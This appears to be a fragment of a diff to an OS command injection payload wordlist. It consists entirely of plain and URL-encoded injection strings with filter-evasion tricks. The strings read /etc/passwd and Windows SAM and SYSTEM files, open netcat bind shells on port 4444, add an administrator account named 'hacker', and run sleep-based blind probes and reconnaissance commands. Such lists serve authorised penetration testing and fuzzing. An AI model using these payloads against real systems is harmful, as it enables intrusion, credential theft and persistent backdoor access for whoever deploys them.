-id%22%22%26whoami%22%26%26whoami%22whoami%22%7Cwhoami%22%7C%7Cwhoami%22
-id%2500
-id%2500%7C
-id%257f
-id%7f
-ifconfig
-ifs%3D%2C%3B%60cat%3C%3C%3Ccat%2C%2Fetc%2Fpasswd%60
-ifs%3D%5D%3Bb%3Dcat%5D%2Fetc%2Fpasswd%3B%24b
-ifs=,;`cat<<<cat,/etc/passwd`
-ifs=];b=cat]/etc/passwd;$b
-ipconfig
-ipconfig%20%2Fall
-ipconfig/all
-ls
-ls${ls_colors:10:1}${ifs}id
-ls%0aid
-ls%20%250a%20id
-ls%20%26%20id
-ls%20%26%26%20id
-ls%20%26%26id%3B
-ls%20%26id%3B
-ls%20%7C%20id
-ls%20%7C%7C%20id
-ls%20%7C%7Cid%3B
-ls%20%7Cid%3B
-ls%20-l%20%2F
-ls%20-l%20%2Fetc%2F
-ls%20-l%20%2Fhome%2F%2A
-ls%20-l%20%2Ftmp
-ls%20-l%20%2Fvar%2Fwww%2F%2A
-ls%20-lh%20%2Fetc%2F
-ls%201%3E%262%20%7C%20id
-ls%24%7Bls_colors%3A10%3A1%7D%24%7Bifs%7Did
-ls%26%20id%3B
-ls%26%26%20id%3B
-ls%26%26id%3B
-ls%26id%3B
-ls%3B%20id
-ls%7C%20id%3B
-ls%7C%7C%20id%3B
-ls%7C%7Cid%3B
-ls%7Cid%3B
-ls&&id
-ls&&id;
-ls&id
-ls&id;
-ls-l/
-ls-l/etc/
-ls-l/home/*
-ls-l/tmp
-ls-l/var/www/*
-ls-lh/etc/
-ls1>&2|id
-ls;id
-ls|id
-ls|id;
-ls||id
-ls||id;
-nc%20-lvvp%204444%20-e%20%2Fbin%2Fsh
-nc%20-lvvp%204444%20-e%20%2Fbin%2Fsh%3B
-nc%20-lvvp%204444%20-e%20%2Fbin%2Fsh%7C
-nc-lvvp4444-e/bin/sh
-nc-lvvp4444-e/bin/sh;
-nc-lvvp4444-e/bin/sh|
-net%20localgroup%20administrators%20hacker%20%2Fadd
-net%20user%20hacker%20password1%20%2Fadd
-net%20view
-netlocalgroupadministratorshacker/add
-netstat%20-an
-netstat-an
-netuserhackerpassword1/add
-netview
-p$(u)i$(u)n$(u)g
-p$(u)i$(u)n$(u)g127.0.0.1
-p${u}i${u}n${u}g
-p${u}i${u}n${u}g127.0.0.1
-p%24%28u%29i%24%28u%29n%24%28u%29g
-p%24%28u%29i%24%28u%29n%24%28u%29g%20127.0.0.1
-p%24%7Bu%7Di%24%7Bu%7Dn%24%7Bu%7Dg
-p%24%7Bu%7Di%24%7Bu%7Dn%24%7Bu%7Dg%20127.0.0.1
-perl%20-e%20%27print%20%22x%22x1024%27
-perl-e'print"x"x1024'
-printf%.1s"$pwd"
-printf%20%25.1s%20%22%24pwd%22
-pwd
-sleep%205
-sleep5
-system%28%27cat%20%2Fetc%2Fpasswd%27%29%3B
-system%28%27pwd%27%29
-system%28%27pwd%27%29%3B
-system%28%27sleep%205%27%29
-system%28%27sleep%205%27%29%3B
-system%28%27whoami%27%29
-system%28%27whoami%27%29%3B
-system('cat/etc/passwd');
-system('pwd')
-system('pwd');
-system('sleep5')
-system('sleep5');
-system('whoami')
-system('whoami');
-systeminfo
-test%2A%20%26%20perl%20-e%20%27print%20%22x%22x16096%27
-test%2A%20%26%26%20perl%20-e%20%27print%20%22x%22x16096%27
-test%2A%20%7C%20perl%20-e%20%27print%20%22x%22x16096%27
-test%2A%20%7C%7C%20perl%20-e%20%27print%20%22x%22x16096%27
-test%2A%3B%20ls%20-lhtr%20%2Fvar%2Fwww%2F
-test%2A%3B%20perl%20-e%20%27print%20%22x%22x16096%27
-test*&&perl-e'print"x"x16096'
-test*&perl-e'print"x"x16096'
-test*;ls-lhtr/var/www/
-test*;perl-e'print"x"x16096'
-test*|perl-e'print"x"x16096'
-test*||perl-e'print"x"x16096'
-time%20if%20%5B%20%24%28whoami%7Ccut%20-c%201%29%20%3D%3D%20s%20%5D%3B%20then%20sleep%205%3B%20fi
-timeif[$(whoami|cut-c1)==s];thensleep5;fi
-type%20%25systemroot%25%5Crepair%5Csam
-type%20%25systemroot%25%5Crepair%5Csystem
-type%20c%3A%5Cwindows%5Crepair%5Csam
-type%20c%3A%5Cwindows%5Crepair%5Csystem
-type%20c%3A%5Cwinnt%5Crepair%5Csam
-type%20c%3A%5Cwinnt%5Crepair%5Csystem
-type%systemroot%\repair\sam
-type%systemroot%\repair\system
-typec:\windows\repair\sam
-typec:\windows\repair\system
-typec:\winnt\repair\sam
-typec:\winnt\repair\system
-uname%20-a
-uname-a
-uniq%20%5Ba-z%5D%5Ba-z%5D%5Ba-z%5D%5Ba-z%5D.%5Ba-z%5D%5Ba-z%5D%5Ba-z%5D
-uniq[a-z][a-z][a-z][a-z].[a-z][a-z][a-z]
-w%60u%60h%60u%60o%60u%60a%60u%60m%60u%60i
-w`u`h`u`o`u`a`u`m`u`i
-which%20curl
-which%20python
-which%20wget
-whichcurl
-whichpython
-whichwget
-while%20read%20-r%20line%3B%20do%20echo%20%24line%3B%20done%20%3C%20%2Fetc%2Fpasswd
-whileread-rline;doecho$line;done</etc/passwd
-who$@ami
-who%24%40ami
-whoami
-x%3D%24%27cat%5Cx20%2Fetc%2Fpasswd%27%26%26%24x
-x=$'cat\x20/etc/passwd'&&$x
-xxd%20-r%20-ps%20%3C%28echo%202f6574632f706173737764%29
-xxd-r-ps<(echo2f6574632f706173737764)
-{cat,/etc/passwd}
-{echo,test}
-|/bin/ls-al
-|/usr/bin/id
-|/usr/bin/id|
-|\nid\n
-|dir
-|dirc:\
-|dirc:\documentsandsettings\*
-|dirc:\users
-|id
-|id;
-|id|
-|ifconfig
-|ipconfig/all
-|ls
-|ls-l/
-|ls-l/etc/
-|ls-la
-|ls-lar/etc
-|ls-lar/var/www
-|nc-lvvp4444-e/bin/sh|
-|netlocalgroupadministratorshacker/add
-|netstat-an
-|netuserhackerpassword1/add
-|netview
-|perl-e'print"x"x16096'
-|phpinfo()
-|pwd
-|sleep5
-|system('sleep5');
-|systeminfo
-|type%systemroot%\repair\sam
-|type%systemroot%\repair\system
-|typec:\windows\repair\sam
-|typec:\windows\repair\system
-|typec:\winnt\repair\sam
-|uname-a
-|usr/bin/id\n
-|whoami
-||/usr/bin/id;
-||/usr/bin/id|
-||id
-||perl-e'print"x"x16096'
-||phpinfo()
-||ping-i30127.0.0.1;x||ping-n30127.0.0.1&
-||sleep10
-||system('sleep5');
+%7C%7C%20%24PATH
+%7C%7C%20%2Fusr%2Fbin%2Fid
+%7C%7C%20cd
+%7C%7C%20ping%20-c%205%20127.0.0.1
+%7C%7C%20ping%20-n%205%20127.0.0.1
+%7C%7C%20pwd
+%7C%7C%20systeminfo
+%7C%7C%20whoami
+%7C%7C%24PATH
+%7C%7C%2Fusr%2Fbin%2Fid
+%7C%7Ccat%20%2Fetc%2Fpasswd
+%7C%7Ccd
+%7C%7Cping%20-c%205%20127.0.0.1
+%7C%7Cping%20-n%205%20127.0.0.1
+%7C%7Cpwd
+%7C%7Csysteminfo
+%7C%7Cwhoami
